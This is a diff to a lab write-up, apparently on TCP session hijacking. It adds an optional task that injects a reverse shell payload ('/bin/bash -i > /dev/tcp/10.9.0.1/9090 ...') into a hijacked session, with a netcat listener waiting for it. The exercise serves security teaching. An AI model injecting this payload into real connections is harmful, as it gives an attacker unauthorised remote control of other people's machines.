@@ -57,3 +57,10 @@ send(p, verbose=0, iface="br-d5b6ec4e964d")
 After logging back into the container it is possibile to see that the file has actually been created.
 
 ![img1](img1.png)
+
+## Task 4 (Optional): Creating Reverse Shell using TCP Session Hijacking
+
+Open a nc connection in listening mode on the attacker machine, and substitute the data variable in the previous script with 
+```py
+data = '/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n'.encode()
+```
